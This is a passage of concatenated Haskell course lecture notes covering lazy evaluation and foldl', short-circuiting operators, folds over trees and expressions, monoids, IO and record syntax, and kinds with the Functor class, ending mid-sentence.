          { the second clause does not match but the third clause
            does. Note that (3-1) does not get evaluated yet! }
    = 7 : take (3-1) (repeat 7)
          { In order to decide on the first clause, we must test (3-1)
            <= 0 which requires evaluating (3-1). }
    = 7 : take 2 (repeat 7)
          { 2 <= 0 is False, so we must expand repeat 7 again. }
    = 7 : take 2 (7 : repeat 7)
          { The rest is similar. }
    = 7 : 7 : take (2-1) (repeat 7)
    = 7 : 7 : take 1 (repeat 7)
    = 7 : 7 : take 1 (7 : repeat 7)
    = 7 : 7 : 7 : take (1-1) (repeat 7)
    = 7 : 7 : 7 : take 0 (repeat 7)
    = 7 : 7 : 7 : []

(Note that although evaluation *could* be implemented exactly like the
above, most Haskell compilers will do something a bit more
sophisticated.  In particular, GHC uses a technique called *graph
reduction*, where the expression being evaluated is actually
represented as a *graph*, so that different parts of the expression
can share pointers to the same subexpression.  This ensures that work
is not duplicated unnecessarily.  For example, if `f x = [x,x]`,
evaluating `f (1+1)` will only do *one* addition, because the
subexpression `1+1` will be shared between the two occurrences of
`x`.)

Consequences
------------

Laziness has some very interesting, pervasive, and nonobvious
consequences.  Let's explore a few of them.

**Purity**

As we've already seen, choosing a lazy evaluation strategy essentially
*forces* you to also choose purity (assuming you don't want
programmers to go insane).

**Understanding space usage**

Laziness is not all roses.  One of the downsides is that it sometimes
becomes tricky to reason about the space usage of your programs.
Consider the following (innocuous-seeming) example:

~~~~ {.haskell}
-- Standard library function foldl, provided for reference
foldl :: (b -> a -> b) -> b -> [a] -> b
foldl _ z []     = z
foldl f z (x:xs) = foldl f (f z x) xs
~~~~

Let's consider how evaluation proceeds when we evaluate `foldl (+) 0
[1,2,3]` (which sums the numbers in a list):

      foldl (+) 0 [1,2,3]
    = foldl (+) (0+1) [2,3]
   = foldl (+) ((0+1)+2) [3]
   = foldl (+) (((0+1)+2)+3) []
   = (((0+1)+2)+3)
   = ((1+2)+3)
   = (3+3)
   = 6

Since the value of the accumulator is not demanded until recursing
through the entire list, the accumulator simply builds up a big
unevaluated expression `(((0+1)+2)+3)`, which finally gets reduced to
a value at the end.  There are at least two problems with this.  One
is that it's simply inefficient: there's no point in transferring all
the numbers from the list into a different list-like thing (the
accumulator thunk) before actually adding them up.  The second problem
is more subtle, and more insidious: evaluating the expression
`(((0+1)+2)+3)` actually requires pushing the `3` and `2` onto a stack
before being able to compute `0+1` and then unwinding the stack,
adding along the way. This is not a problem for this small example,
but for very long lists it's a big problem: there is usually not as
much space available for the stack, so this can lead to a stack
overflow.

The solution in this case is to use the `foldl'` function instead of
`foldl`, which adds a bit of strictness: in particular, `foldl'`
requires its second argument (the accumulator) to be evaluated before
it proceeds, so a large thunk never builds up:

      foldl' (+) 0 [1,2,3]
    = foldl' (+) (0+1) [2,3]
   = foldl' (+) 1 [2,3]
   = foldl' (+) (1+2) [3]
   = foldl' (+) 3 [3]
   = foldl' (+) (3+3) []
   = foldl' (+) 6 []
   = 6

As you can see, `foldl'` does the additions along the way, which is
what we really want.  But the point is that in this case laziness got
in the way and we had to make our program *less* lazy.

(If you're interested in learning about *how* `foldl'` achieves this,
you can
[read about `seq` on the Haskell wiki](http://www.haskell.org/haskellwiki/Seq).)

**Short-circuiting operators**

In some languages (Java, C++) the boolean operators `&&` and `||`
(logical AND and OR) are *short-circuiting*: for example, if the first
argument to `&&` evaluates to false, the whole expression will
immediately evaluate to false without touching the second argument.
However, this behavior has to be wired into the Java and C++ language
standards as a special case. Normally, in a strict langauge, both
arguments of a two-argument function are be evaluated before calling
the function.  So the short-circuiting behavior of `&&` and `||` is a
special exception to the usual strict semantics of the language.

In Haskell, however, we can define short-circuiting operators without
any special cases.  In fact, `(&&)` and `(||)` are just plan old
library functions!  For example, here's how `(&&)` is defined:

~~~~ {.haskell}
(&&) :: Bool -> Bool -> Bool
True  && x = x
False && _ = False
~~~~

Notice how this definition of `(&&)` does not pattern-match on its
second argument.  Moreover, if the first argument is `False`, the
second argument is entirely ignored. Since `(&&)` does not
pattern-match on its second argument at all, it is short-circuiting in
exactly the same way as the `&&` operator in Java or C++.

Notice that `(&&)` also could have been defined like this:

> (&&!) :: Bool -> Bool -> Bool
> True  &&! True  = True
> True  &&! False = False
> False &&! True  = False
> False &&! False = False

While this version takes on the same values as `(&&)`, it has
different behavior.  For example, consider the following:

~~~~ {.haskell}
False &&  (34^9784346 > 34987345)
False &&! (34^9784346 > 34987345)
~~~~

These will both evaluate to `False`, but the second one will take a
whole lot longer!  Or how about this:

~~~~ {.haskell}
False &&  (head [] == 'x')
False &&! (head [] == 'x')
~~~~

The first one is again `False`, whereas the second one will crash.
Try it!

All of this points out that there are some interesting issues
surrounding laziness to be considered when defining a function.

**User-defined control structures**

Taking the idea of short-circuiting operators one step further, in
Haskell we can define our own *control structures*.

Most languages have some sort of special built-in `if` construct.
Some thought reveals why: in a way similar to short-circuiting Boolean
operators, `if` has special behavior.  Based on the value of the test,
it executes/evaluates only *one* of the two branches.  It would defeat
the whole purpose if both branches were evaluated every time!

In Haskell, however, we can define `if` as a library function!

> if' :: Bool -> a -> a -> a
> if' True  x _ = x
> if' False _ y = y

Of course, Haskell *does* have special built-in `if`-expressions, but
I have never quite understood why.  Perhaps it is simply because the
language designers thought people would expect it.  "What do you mean,
this language doesn't have `if`!?"  In any case, `if` doesn't get used
that much in Haskell anyway; in most situations we prefer
pattern-matching or guards.

We can also define other control structures---we'll see other examples
when we discuss monads.

**Infinite data structures**

Lazy evaluation also means that we can work with *infinite data
structures*.  In fact, we've already seen a few examples, such as
`repeat 7`, which represents an infinite list containing nothing but
`7`.  Defining an infinite data structure actually only creates a
thunk, which we can think of as a "seed" out of which the entire data
structure can *potentially* grow, depending on what parts actually are
used/needed.

Another practical application area is "effectively infinite" data
structures, such as the trees that might arise as the state space of a
game (such as go or chess).  Although the tree is finite in theory, it
is so large as to be effectively infinite---it certainly would not fit
in memory.  Using Haskell, we can define the tree of all possible
moves, and then write a separate algorithm to explore the tree in
whatever way we want. Only the parts of the tree which are actually
explored will be computed.

**Pipelining/wholemeal programming**

As I have mentioned before, doing "pipelined" incremental
transformations of a large data structure can actually be
memory-efficient.  Now we can see why: due to laziness, each stage of
the pipeline can operate in lockstep, only generating each bit of the
result as it is demanded by the next stage in the pipeline.

**Dynamic programming**

As a more specific example of the cool things lazy evaluation buys us,
consider the technique of
[*dynamic programming*](http://en.wikipedia.org/wiki/Dynamic_programming).
Usually, one must take great care to fill in entries of a dynamic
programming table in the proper order, so that every time we compute
the value of a cell, its dependencies have already been computed.  If
we get the order wrong, we get bogus results.

However, using lazy evaluation we can get the Haskell runtime to work
out the proper order of evaluation for us!  For example, here is some
Haskell code to solve the
[0-1 knapsack problem](http://en.wikipedia.org/wiki/Knapsack_problem).
Note how we simply define the array `m` in terms of itself, using the
standard recurrence, and let lazy evaluation work out the proper order
in which to compute its cells.

~~~~ {.haskell}
import Data.Array

knapsack01 :: [Double]   -- values 
           -> [Integer]  -- nonnegative weights
           -> Integer    -- knapsack size
           -> Double     -- max possible value
knapsack01 vs ws maxW = m!(numItems-1, maxW)
  where numItems = length vs
        m = array ((-1,0), (numItems-1, maxW)) $
              [((-1,w), 0) | w <- [0 .. maxW]] ++
              [((i,0), 0) | i <- [0 .. numItems-1]] ++
              [((i,w), best) 
                  | i <- [0 .. numItems-1]
                  , w <- [1 .. maxW]
                  , let best
                          | ws!!i > w  = m!(i-1, w)
                          | otherwise = max (m!(i-1, w)) 
                                            (m!(i-1, w - ws!!i) + vs!!i)
              ]

example = knapsack01 [3,4,5,8,10] [2,3,4,5,9] 20 
~~~~

 <!--
 
XXX dumped here from last time: 

Lazy Evaluation
---------------

Lazy evaluation in Haskell means that expressions aren't evaluated
until they are needed. In many cases, this "need" amounts to printing
out a result, which GHCi does for us whenever it attempts to show us a
value. This evaluation strategy, sometimes referred to as non-strict,
means that expressions such as

> safeNums :: [Int]
> safeNums = take 2 [3, 4, 6, 5 `div` 0, 7, 8]

are perfectly well defined! Yes, there is an expression in that list
that, if evaluated, would raise an exception, but why do we need to
evaluate that division by zero when we've only asked for the first two
elements of the list. In fact, Haskell won't evaluate that dangerous
application of the `div` function, because it isn't needed.

As another example, we have already seen infinite lists, 

> nats :: [Int]
> nats = [0..]

Is this list useful? We don't want to wait around to compute the
length of it, but it is very handy as a source of sequential non-negative
integers. If we want to label the elements of a list, we might write a function like, 

> label :: [a] -> [(Int, a)]
> label = zip [0..]

The fact that `nats` or `[0..]` is infinite doesn't matter because we
will only evaluate as many elements as are needed: remember that the
return value of `zip` has the length of the shorter argument list
given to `zip`. This is the natural way of defining `zip` as there is
no obvious thing to do once we run out of elements from the shorter
list.

> myZip :: [a] -> [b] -> [(a,b)]
> myZip [] _          = []
> myZip _ []          = []
> myZip (x:xs) (y:ys) = (x,y) : myZip xs ys

This is similar to the situation we had when implementing `map`. An
innocent attempt to write a function that satisfies the type leads to
one particular definition.

Of course, we can also build our own infinite lists for great profit,

> myCycle :: [a] -> [a]
> myCycle lst = go lst
>     where go [] = go lst
>           go (x:xs) = x : go xs

This is our own version of the `cycle` function from the standard
library. We saw a use of this function in one implementation of the
`doubleEveryOther` function from homework 1. A similar use is if we
want to extract every other element from a list: we could pattern
match, or we could write,

> everyOther :: [a] -> [a]
> everyOther = map snd . filter fst . zip (cycle [True,False])

This is representative of a declarative style: we are not
specifying _how_ to drop every other element, we are 

1. Specifying how to augment some input data: `zip (cycle
[True,False])`
2. Describing a simple manipulation of that augmented data: `filter
fst`, then
3. Tearing down leftover additional structure: `map snd`

Note that we are not dealing with the list structure in this
implementation, and the _only_ bit of customization is the literal
list `[True, False]` which exactly reflects the unique structure of
our program: the notion of "every other."

-->

 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->



/CS194 Lectures 07 Folds and monoids
=====================================

 <!-- CLASS
 
> {-# OPTIONS_GHC -Wall #-}
> {-# LANGUAGE GeneralizedNewtypeDeriving #-}

-->

CIS 194 Week 7  
25 February 2013

Suggested reading: 

  * Learn You a Haskell, [Only folds and horses](http://learnyouahaskell.com/higher-order-functions#folds)
  * Learn You a Haskell, [Monoids](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#monoids)
  * [Fold](http://haskell.org/haskellwiki/Fold) from the Haskell wiki
  * Heinrich Apfelmus, [Monoids and Finger Trees](http://apfelmus.nfshost.com/articles/monoid-fingertree.html)
  * Dan Piponi, [Haskell Monoids and their Uses](http://blog.sigfpe.com/2009/01/haskell-monoids-and-their-uses.html)
  * [Data.Monoid documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Monoid.html)
  * [Data.Foldable documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Foldable.html)

Folds, again
------------

We've already seen how to define a folding function for lists... but
we can generalize the idea to other data types as well!

Consider the following data type of binary trees with data stored at
internal nodes:

> data Tree a = Empty
>             | Node (Tree a) a (Tree a)
>   deriving (Show, Eq)
>
> leaf :: a -> Tree a
> leaf x = Node Empty x Empty

Let's write a function to compute the size of a tree (*i.e.* the
number of `Node`s):

> treeSize :: Tree a -> Integer
> treeSize Empty        = 0
> treeSize (Node l _ r) = 1 + treeSize l + treeSize r

How about the sum of the data in a tree of `Integer`s? 

> treeSum :: Tree Integer -> Integer
> treeSum Empty     = 0
> treeSum (Node l x r)  = x + treeSum l + treeSum r

Or the depth of a tree? 

> treeDepth :: Tree a -> Integer
> treeDepth Empty        = 0
> treeDepth (Node l _ r) = 1 + max (treeDepth l) (treeDepth r)

Or flattening the elements of the tree into a list? 

> flatten :: Tree a -> [a]
> flatten Empty        = []
> flatten (Node l x r) = flatten l ++ [x] ++ flatten r

Are you starting to see any patterns?  Each of the above functions:

  1. takes a `Tree` as input
  1. pattern-matches on the input `Tree`
  1. in the `Empty` case, gives a simple answer
  1. in the `Node` case:
      1. calls itself recursively on both subtrees
      1. somehow combines the results from the recursive calls with the data `x` to produce the final result

As good programmers, we always strive to abstract out repeating
patterns, right?  So let's generalize.  We'll need to pass as
parameters the parts of the above examples which change from example
to example:

  1. The return type
  1. The answer in the `Empty` case
  1. How to combine the recursive calls 

We'll call the type of data contained in the tree `a`, and the type of
the result `b`.

> treeFold :: b -> (b -> a -> b -> b) -> Tree a -> b
> treeFold e _ Empty        = e
> treeFold e f (Node l x r) = f (treeFold e f l) x (treeFold e f r)

Now we should be able to define `treeSize`, `treeSum` and the other
examples much more simply.  Let's try:

> treeSize' :: Tree a -> Integer
> treeSize' = treeFold 0 (\l _ r -> 1 + l + r)
>
> treeSum' :: Tree Integer -> Integer
> treeSum' = treeFold 0 (\l x r -> l + x + r)
> 
> treeDepth' :: Tree a -> Integer
> treeDepth' = treeFold 0 (\l _ r -> 1 + max l r)
>
> flatten' :: Tree a -> [a]
> flatten' = treeFold [] (\l x r -> l ++ [x] ++ r)

We can write new tree-folding functions easily as well: 

> treeMax :: (Ord a, Bounded a) => Tree a -> a
> treeMax = treeFold minBound (\l x r -> l `max` x `max` r)

Much better! 

**Folding expressions**

Where else have we seen folds? 

Recall the `ExprT` type and corresponding `eval` function from Homework 5:

> data ExprT = Lit Integer
>            | Add ExprT ExprT
>            | Mul ExprT ExprT
>
> eval :: ExprT -> Integer
> eval (Lit i)     = i
> eval (Add e1 e2) = eval e1 + eval e2
> eval (Mul e1 e2) = eval e1 * eval e2

Hmm... this looks familiar!  What would a fold for `ExprT` look like?

> exprTFold :: (Integer -> b) -> (b -> b -> b) -> (b -> b -> b) -> ExprT -> b
> exprTFold f _ _ (Lit i)     = f i
> exprTFold f g h (Add e1 e2) = g (exprTFold f g h e1) (exprTFold f g h e2)
> exprTFold f g h (Mul e1 e2) = h (exprTFold f g h e1) (exprTFold f g h e2)
>
> eval2 :: ExprT -> Integer
> eval2 = exprTFold id (+) (*)

Now we can easily do other things like count the number of
literals in an expression:

> numLiterals :: ExprT -> Int
> numLiterals = exprTFold (const 1) (+) (+)

**Folds in general**

The take-away message is that we can implement a fold for many (though
not all) data types. The fold for `T` will take one (higher-order)
argument for each of `T`'s constructors, encoding how to turn the
values stored by that constructor into a value of the result
type---assuming that any recursive occurrences of `T` have already
been folded into a result.  Many functions we might want to write on `T`
will end up being expressible as simple folds.

Monoids
-------

Here's another standard type class you should know about, found in the
[`Data.Monoid`](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Monoid.html) module:

> class Monoid m where
>     mempty  :: m
>     mappend :: m -> m -> m
>
>     mconcat :: [m] -> m
>     mconcat = foldr mappend mempty
>
> (<>) :: Monoid m => m -> m -> m
> (<>) = mappend

`(<>)` is defined as a synonym for `mappend` (as of GHC 7.4.1) simply
because writing `mappend` is tedious.

Types which are instances of `Monoid` have a special element called
`mempty`, and a binary operation `mappend` (abbreviated `(<>)`) which
takes two values of the type and produces another one.  The intention
is that `mempty` is an identity for `<>`, and `<>` is
associative; that is, for all `x`, `y`, and `z`,

1. `mempty <> x == x`
2. `x <> mempty == x`
3. `(x <> y) <> z == x <> (y <> z)`

The associativity law means that we can unambiguously write things like

`a <> b <> c <> d <> e`

because we will get the same result no matter how we parenthesize.

There is also `mconcat`, for combining a whole list of values.  By
default it is implemented using `foldr`, but it is included in the
`Monoid` class since particular instances of `Monoid` may have more
efficient ways of implementing it.

`Monoid`s show up *everywhere*, once you know to look for them.  Let's
write some instances (just for practice; these are all in the
standard libraries).

Lists form a monoid under concatenation: 

> instance Monoid [a] where
>   mempty  = []
>   mappend = (++)

As hinted above, addition defines a perfectly good monoid on integers
(or rational numbers, or real numbers...).  However, so does
multiplication!  What to do? We can't give two different instances of
the same type class to the same type.  Instead, we create two
`newtype`s, one for each instance:

> newtype Sum a = Sum a
>   deriving (Eq, Ord, Num, Show)
>
> getSum :: Sum a -> a
> getSum (Sum a) = a
>
> instance Num a => Monoid (Sum a) where
>   mempty  = Sum 0
>   mappend = (+)
>
> newtype Product a = Product a
>   deriving (Eq, Ord, Num, Show)
>
> getProduct :: Product a -> a
> getProduct (Product a) = a
>
> instance Num a => Monoid (Product a) where
>   mempty  = Product 1
>   mappend = (*)

Note that to find, say, the product of a list of `Integer`s using
`mconcat`, we have to first turn them into values of type `Product
Integer`:

> lst :: [Integer]
> lst = [1,5,8,23,423,99]
>
> prod :: Integer
> prod = getProduct . mconcat . map Product $ lst

(Of course, this particular example is silly, since we could use the
standard `product` function instead, but this pattern does come in
handy somtimes.)

Pairs form a monoid as long as the individual components do:

> instance (Monoid a, Monoid b) => Monoid (a,b) where
>   mempty = (mempty, mempty)
>   (a,b) `mappend` (c,d) = (a `mappend` c, b `mappend` d)

Challenge: can you make an instance of `Monoid` for `Bool`?  How many
different instances are there?

Challenge: how would you make function types an instance of
`Monoid`?


 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->


/CS194 Lectures 08 IO
=====================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}
> {-# LANGUAGE GeneralizedNewtypeDeriving #-}

-->

CIS 194 Week 8  
11 March 2013

Suggested reading: 

  * [LYAH Chapter 9: Input and Output](http://learnyouahaskell.com/input-and-output)
  * [RWH Chapter 7: I/O](http://book.realworldhaskell.org/read/io.html)

The problem with purity
-----------------------

Remember that Haskell is *lazy* and therefore *pure*.  This means two
primary things:

1. Functions may not have any external effects. For example, a
   function may not print anything on the screen.  Functions may
   only compute their outputs.

2. Functions may not depend on external stuff.  For example, they may
   not read from the keyboard, or filesystem, or network.  Functions
   may depend only on their inputs---put another way, functions should
   give the same output for the same input every time.

But---sometimes we *do* want to be able to do stuff like this!  If the
only thing we could do with Haskell is write functions which we can
then evaluate at the ghci prompt, it would be theoretically
interesting but practically useless.

In fact, it *is* possible to do these sorts of things with Haskell,
but it looks very different than in most other languages.

The `IO` type
-------------

The solution to the conundrum is a special type called `IO`.  Values
of type `IO a` are *descriptions of* effectful computations, which, if
executed would (possibly) perform some effectful I/O operations and
(eventually) produce a value of type `a`.  There is a level of
indirection here that's crucial to understand.  A value of type `IO
a`, *in and of itself*, is just an inert, perfectly safe thing with no
effects. It is just a *description* of an effectful computation.  One
way to think of it is as a *first-class imperative program*.

As an illustration, suppose you have 

    c :: Cake

What do you have?  Why, a delicious cake, of course.  Plain and
simple.

<img src="/static/cake.jpg" width="200" />

By contrast, suppose you have 

    r :: Recipe Cake

What do you have?  A cake?  No, you have some *instructions* for how
to make a cake, just a sheet of paper with some writing on it.  

<img src="/static/recipe.gif" width="200" />

Not only do you not actually have a cake, merely being in possession
of the recipe has no effect on anything else whatsoever.  Simply
holding the recipe in your hand does not cause your oven to get hot or
flour to be spilled all over your floor or anything of that sort.  To
actually produce a cake, the recipe must be *followed* (causing flour
to be spilled, ingredients mixed, the oven to get hot, *etc.*).

<img src="/static/fire.jpg" width="200" />

In the same way, a value of type `IO a` is just a "recipe" for
producing a value of type `a` (and possibly having some effects along
the way).  Like any other value, it can be passed as an argument,
returned as the output of a function, stored in a data structure, or
(as we will see shortly) combined with other `IO` values into more
complex recipes.

So, how do values of type `IO a` actually ever get executed?  There is
only one way: the Haskell compiler looks for a special value

    main :: IO ()

which will actually get handed to the runtime system and 
executed. That's it! Think of the Haskell runtime system as a master
chef who is the only one allowed to do any cooking.

<img src="/static/chef.jpg" width="200" />

If you want your recipe to be followed then you had better make it
part of the big recipe (`main`) that gets handed to the master chef.
Of course, `main` can be arbitrarily complicated, and will usually be
composed of many smaller `IO` computations.

So let's write our first actual, executable Haskell program!  We can
use the function

    putStrLn :: String -> IO ()

which, given a `String`, returns an `IO` computation that will (when
executed) print out that `String` on the screen.  So we simply put
this in a file called `Hello.hs`:

    main = putStrLn "Hello, Haskell!"

Then typing `runhaskell Hello.hs` at a command-line prompt results in
our message getting printed to the screen!  We can also use `ghc
--make Hello.hs` to produce an executable version called `Hello` (or
`Hello.exe` on Windows).

There is no `String` "inside" an `IO String`
--------------------------------------------

Many new Haskell users end up at some point asking a question like "I
have an `IO String`, how do I turn it into a `String`?", or, "How do I
get the `String` out of an `IO String`"?  Given the above intuition,
it should be clear that these are nonsensical questions: a value of
type `IO String` is a description of some computation, a *recipe*, for
generating a `String`.  There is no `String` "inside" an `IO String`,
any more than there is a cake "inside" a cake recipe.  To produce a
`String` (or a delicious cake) requires actually *executing* the
computation (or recipe).  And the only way to do that is to give it
(perhaps as part of some larger `IO` value) to the Haskell runtime
system, via `main`.

Combining `IO`
--------------

As should be clear by now, we need a way to *combine* `IO`
computations into larger ones.

The simplest way to combine two `IO` computations is with the `(>>)`
operator (pronounced "and then"), which has the type

~~~~ {.haskell}
(>>) :: IO a -> IO b -> IO b
~~~~

This simply creates an `IO` computation which consists of running the
two input computations in sequence.  Notice that the result of the
first computation is discarded; we only care about it for its
*effects*.  For example:

~~~~ {.haskell}
main = putStrLn "Hello" >> putStrLn "world!"
~~~~

This works fine for code of the form "do this; do this; do this" where
the results don't really matter. However, in general this is
insufficient.  What if we don't want to throw away the result from the
first computation?
  
A first attempt at resolving the situation might be to have something
of type `IO a -> IO b -> IO (a,b)`.  However, this is also
insufficient. The reason is that we want the second computation to be
able to *depend* on the result of the first.  For example, suppose we
want to read an integer from the user and then print out one more than
the integer they entered.  In this case the second computation
(printing some number on the screen) will be different depending on
the result of the first.
  
Instead, there is an operator `(>>=)` (pronounced "bind") with the
type

~~~~ {.haskell}
(>>=) :: IO a -> (a -> IO b) -> IO b
~~~~

This can be difficult to wrap one's head around at first!  `(>>=)`
takes a computation which will produce a value of type `a`, and a
*function* which gets to *compute* a second computation based on this
intermediate value of type `a`.  The result of `(>>=)` is a
(description of a) computation which performs the first computation,
uses its result to decide what to do next, and then does that.

For example, we can write a program to read a number from the user and
print out its successor.  Note our use of `readLn :: Read a => IO a`
which is a computation that reads input from the user and converts it
into any type which is an instance of `Read`.

~~~~ {.haskell}
main :: IO ()
main = putStrLn "Please enter a number: " >> (readLn >>= (\n -> putStrLn (show (n+1))))
~~~~

Of course, this looks kind of ugly, but there are better ways to write it, which
we'll talk about in the future.


Record syntax
-------------

*This material was not covered in lecture, but is provided as an extra
 resource for completing homework 8.*

Suppose we have a data type such as 

~~~~ {.haskell}
data D = C T1 T2 T3
~~~~

We could also declare this data type with *record syntax* as follows:

~~~~ {.haskell}
data D = C { field1 :: T1, field2 :: T2, field3 :: T3 }
~~~~

where we specify not just a type but also a *name* for each field
stored inside the `C` constructor.  This new version of `D` can be
used in all the same ways as the old version (in particular we can
still construct and pattern-match on values of type `D` as `C v1 v2
v3`).  However, we get some additional benefits.

  1. Each field name is automatically a *projection function* which
     gets the value of that field out of a value of type `D`.  For
     example, `field2` is a function of type

    ~~~~ {.haskell}
   field2 :: D -> T2
   ~~~~

     Before, we would have had to implement `field2` ourselves by
     writing

    ~~~~ {.haskell}
   field2 (C _ f _) = f
   ~~~~

    This gets rid of a lot of boilerplate if we have a data type with
    many fields!

  1. There is special syntax for *constructing*, *modifying*, and
     *pattern-matching* on values of type `D` (in addition to the
     usual syntax for such things).

    We can *construct* a value of type `D` using syntax like

    ~~~~ {.haskell}
    C { field3 = ..., field1 = ..., field2 = ... }
    ~~~~

     with the `...` filled in by expressions of the right type.  Note
     that we can specify the fields in any order.

     Suppose we have a value `d :: D`.  We can *modify* `d` using
     syntax like

    ~~~~ {.haskell}
    d { field3 = ... }
    ~~~~

     Of course, by "modify" we don't mean actually mutating `d`, but
     rather constructing a new value of type `D` which is the same as
     `d` except with the `field3` field replaced by the given value.

     Finally, we can *pattern-match* on values of type `D` like so:

    ~~~~ {.haskell}
    foo (C { field1 = x }) = ... x ...
    ~~~~

     This matches only on the `field1` field from the `D` value,
     calling it `x` (of course, in place of `x` we could also put an
     arbitrary pattern), ignoring the other fields.

 <!--

Local Variables: 
mode:markdown
compile-command:"mk build"
End:

-->


/CS194 Lectures 09 Functors
===========================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}
>
> import Prelude hiding (Functor(..))

-->

CIS 194 Week 9  
18 March 2013

Suggested reading: 

  * Learn You a Haskell, [The Functor typeclass](http://learnyouahaskell.com/making-our-own-types-and-typeclasses#the-functor-typeclass)
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

Motivation
----------

Over the past weeks we have seen a number of functions designed to
"map" a function over every element of some sort of container.  For
example:

  * `map :: (a -> b) -> [a] -> [b]`

  * `treeMap :: (a -> b) -> Tree a -> Tree b`

  * In Homework 5 many people ended up doing a similar thing when you had to
    somehow apply `eval :: ExprT -> Int` to a `Maybe ExprT` in order to
    get a `Maybe Int`.

    `maybeEval :: (ExprT -> Int) -> Maybe ExprT -> Maybe Int`

    `maybeMap :: (a -> b) -> Maybe a -> Maybe b`

There's a repeated pattern here, and as good Haskell programmers we
want to know how to generalize it!  So which parts are the same from
example to example, and which parts are different?

The part that is different, of course, is the container being "mapped
over":

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
~~~~

But what sort of things are these "containers"?  Can we really assign
a type variable like `f` to them?

A brief digression on kinds
---------------------------

Just as every expression has a type, types themselves have "types",
called *kinds*.  (Before you ask: no, there's not another level beyond
kinds---not in Haskell at least.)  In `ghci` we can ask about the
kinds of types using `:kind`.  For example, let's ask for the kind of
`Int`:

    Prelude> :k Int
    Int :: *

We see that `Int` has kind `*`.  In fact, every type which can
actually serve as the type of some values has kind `*`.

    Prelude> :k Bool
    Bool :: *
    Prelude> :k Char
    Char :: *
    Prelude> :k Maybe Int
    Maybe Int :: *

If `Maybe Int` has kind `*`, then what about `Maybe`?  Notice that
there are no values of type `Maybe`.  There are values of type `Maybe
Int`, and of type `Maybe Bool`, but not of type `Maybe`.  But `Maybe`
is certainly a valid type-like-thing.  So what is it?  What kind does
it have?  Let's ask `ghci`:

    Prelude> :k Maybe
    Maybe :: * -> *

`ghci` tells us that `Maybe` has kind `* -> *`.  `Maybe` is, in a
sense, a *function on types* --- we usually call it a *type
constructor*.  `Maybe` takes as input types of kind `*`, and produces
another type of kind `*`.  For example, it can take as input `Int :: *`
and produce the new type `Maybe Int :: *`.

Are there other type constructors with kind `* -> *`?  Sure.  For
example, `Tree`, or the list type constructor, written `[]`.

    Prelude> :k []
    [] :: * -> *
    Prelude :k [] Int
    [] Int :: *
    Prelude> :k [Int]  -- special syntax for [] Int
    [Int] :: *
    Prelude> :k Tree
    Tree :: * -> *

What about type constructors with other kinds?  How about `JoinList`
from Homework 7?

> data JoinList m a = Empty
>                   | Single m a
>                   | Append m (JoinList m a) (JoinList m a)

    Prelude> :k JoinList
    JoinList :: * -> * -> *

This makes sense: `JoinList` expects *two* types as parameters and
gives us back a new type.  (Of course, it is curried, so we can also
think of it as taking *one* type and giving back something of kind `*
-> *`.)  Here's another one:

    Prelude> :k (->)
    (->) :: * -> * -> *

Tthis tells us that the function type constructor takes two type
arguments.  Like any operator, we use it infix:

    Prelude> :k Int -> Char
    Int -> Char :: *

But we don't have to: 

    Prelude> :k (->) Int Char
    (->) Int Char :: *

OK, what about this one? 

> data Funny f a = Funny a (f a)

    Prelude> :k Funny
    Funny :: (* -> *) -> * -> *

`Funny` takes two arguments, the first one a type of kind `* -> *`,
and the second a type of kind `*`, and constructs a type.  (How did
GHCi know what the kind of `Funny` is?  Well, it does *kind inference*
just like it also does *type inference*.)  `Funny` is a *higher-order*
type constructor, in the same way that `map` is a *higher-order*
function.  Note that types can be partially applied, too,
just like functions:

    Prelude> :k Funny Maybe
    Funny Maybe :: * -> *
    Prelude> :k Funny Maybe Int
    Funny Maybe Int :: *

Functor
-------

The essence of the mapping pattern we saw was a higher-order function
with a type like

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
~~~~

where `f` is a type variable standing in for some type of kind `* ->
*`.  So, can we write a function of this type once and for all?

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
thingMap h fa = ???
~~~~

Well, not really.  There's not much we can do if we don't know what
`f` is.  `thingMap` has to work differently for each particular `f`.
The solution is to make a type class, which is traditionally called
`Functor`:

> class Functor f where
>   fmap :: (a -> b) -> f a -> f b

(`Functor` is defined in the standard Prelude. Note that the name
"functor" comes from category theory, and is *not* the same thing as
functors in C++ (which are essentially first-class functions).)  Now
we can just implement this class in a way specific to each particular
`f`.  Note that the `Functor` class abstracts over types
of kind `* -> *`.  So it would make no sense to write

~~~~ {.haskell}
instance Functor Int where
  fmap = ...
~~~~

Indeed, if we try, we get a very nice *kind mismatch error*:

    [1 of 1] Compiling Main             ( 09-functors.lhs, interpreted )

    09-functors.lhs:145:19:
        Kind mis-match
        The first argument of `Functor' should have kind `* -> *',
        but `Int' has kind `*'
        In the instance declaration for `Functor Int'

If we understand kinds, this error tells us exactly what is wrong.

However, it does make sense (kind-wise) to make a `Functor` instance
for, say, `Maybe`.  Let's do it.  Following the types makes it almost
trivial:

> instance Functor Maybe where
>   fmap _ Nothing  = Nothing
>   fmap h (Just a) = Just (h a)

How about lists? 

> instance Functor [] where
>   fmap _ []     = []
>   fmap f (x:xs) = f x : fmap f xs
>   -- or just
>   -- fmap = map

Easy peasy.  What about `IO`?  Could it make sense to create an
instance of `Functor` for `IO`?

Sure.  `fmap :: (a -> b) -> IO a -> IO b` results in the IO action
which first runs the `IO a` action, then applies the function to
transform the result before returning it.  We can implement this
without too much trouble:

~~~~ {.haskell}
instance Functor IO where
  fmap f ioa = ioa >>= (\a -> return (f a))
~~~~

or even 

> instance Functor IO where
>   fmap f ioa = ioa >>= (return . f)

Now let's try something a bit more mind-twisting: 

> instance Functor ((->) e) where

What!? Well, let's follow the types: if `f = (->) e` then we want

> fmap :: (a -> b) -> (->) e a -> (->) e b

or, with `(->)` written infix: 

> fmap :: (a -> b) -> (e -> a) -> (e -> b)

Hmm, this type signature seems familiar...

> instance Functor ((->) e) where
>   fmap = (.)

Crazy!  What does this mean?  Well, one way to think of a value of
type `(e -> a)` is as a "`e`-indexed container" with one value of `a`
